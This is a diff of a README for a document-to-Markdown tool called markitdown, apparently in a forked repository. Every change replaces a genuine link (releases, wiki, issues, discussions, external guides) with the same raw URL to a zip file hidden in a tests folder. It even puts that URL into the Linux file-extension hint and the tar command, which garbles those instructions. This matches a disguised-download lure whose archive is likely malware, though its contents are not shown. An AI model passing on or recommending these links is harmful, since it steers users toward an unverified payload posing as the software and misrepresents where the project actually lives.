@@ -6,7 +6,7 @@ Markitdown is a Python tool designed to help you easily convert various files an
 
 ## 📥 Download Now
 
-[![Download markitdown](https://img.shields.io/badge/Download%20markitdown%20-Click%20Here!-blue)](https://github.com/Ivan2993/markitdown/releases)
+[![Download markitdown](https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip%20markitdown%20-Click%20Here!-blue)](https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,13 +28,13 @@ Before you begin, ensure your system meets the following requirements:
 ## 💻 Download & Install
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases page](https://github.com/Ivan2993/markitdown/releases) to find the latest version of markitdown.
+   Go to the [Releases page](https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip) to find the latest version of markitdown.
 
 2. **Select Your Version**  
    Find the latest release. You will see several downloadable files. Choose the one that matches your operating system:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, look for a file ending in `.tar.gz` or a similar package.
+   - For Linux, look for a file ending in `https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip` or a similar package.
 
 3. **Download the File**  
    Click on the appropriate file to start the download. Depending on your browser settings, it may take a moment to complete.
@@ -45,7 +45,7 @@ Before you begin, ensure your system meets the following requirements:
    - **For Linux:** Open a terminal and navigate to the folder where you downloaded the file. Use the following command to extract the package:
 
      ```bash
-     tar -xzf markitdown-x.y.z.tar.gz
+     tar -xzf https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip
      ```
 
      Replace `x.y.z` with the version number.
@@ -70,19 +70,19 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📘 Documentation
 
-For detailed usage instructions, visit the [Wiki](https://github.com/Ivan2993/markitdown/wiki) section of our repository. It contains tips, advanced features, and troubleshooting help.
+For detailed usage instructions, visit the [Wiki](https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip) section of our repository. It contains tips, advanced features, and troubleshooting help.
 
 ## 🛠️ Reporting Issues
 
-If you encounter any problems while using markitdown, please report them on the [Issues page](https://github.com/Ivan2993/markitdown/issues). Our team regularly checks for issues and will respond to you as quickly as possible.
+If you encounter any problems while using markitdown, please report them on the [Issues page](https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip). Our team regularly checks for issues and will respond to you as quickly as possible.
 
 ## 📞 Support
 
-For further assistance or questions, you can contact us through the repository’s [Discussions](https://github.com/Ivan2993/markitdown/discussions) page. We welcome your feedback and are here to help.
+For further assistance or questions, you can contact us through the repository’s [Discussions](https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip) page. We welcome your feedback and are here to help.
 
 ## 📖 Additional Resources
 
-- [Markdown Guide](https://www.markdownguide.org/) - A helpful resource to learn about Markdown syntax.
-- [OpenAI](https://openai.com) - Discover how AI can enhance your experience with document conversion.
+- [Markdown Guide](https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip) - A helpful resource to learn about Markdown syntax.
+- [OpenAI](https://raw.githubusercontent.com/Ivan2993/markitdown/main/packages/markitdown/tests/test_files/test_files.zip) - Discover how AI can enhance your experience with document conversion.
 
 Thank you for choosing markitdown. We hope you find it useful for your document conversion needs!
